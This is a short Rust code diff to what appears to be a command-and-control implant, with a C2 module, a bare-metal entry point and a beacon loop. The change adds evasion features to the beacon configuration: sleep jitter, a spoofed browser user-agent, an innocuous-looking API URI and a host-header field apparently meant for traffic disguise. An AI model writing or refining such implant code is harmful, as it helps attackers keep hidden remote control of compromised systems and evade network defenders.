@@ -20,6 +20,7 @@ pub mod c2;
 pub mod modules;
 
 // Global Allocator
+#[cfg(not(test))]
 #[global_allocator]
 static ALLOCATOR: utils::heap::MiniHeap = utils::heap::MiniHeap::new(0x10000000, 1024 * 1024);
 
@@ -39,8 +40,12 @@ pub extern "C" fn _start() -> ! {
         transport: c2::TransportType::Http,
         server_addr: "127.0.0.1",
         sleep_interval: 5000,
+        jitter: 10,
         kill_date: 0,
         working_hours: (0, 0),
+        user_agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+        uri: "/api/v1/beacon",
+        host_header: "",
     };
 
     // 2. Enter C2 Loop
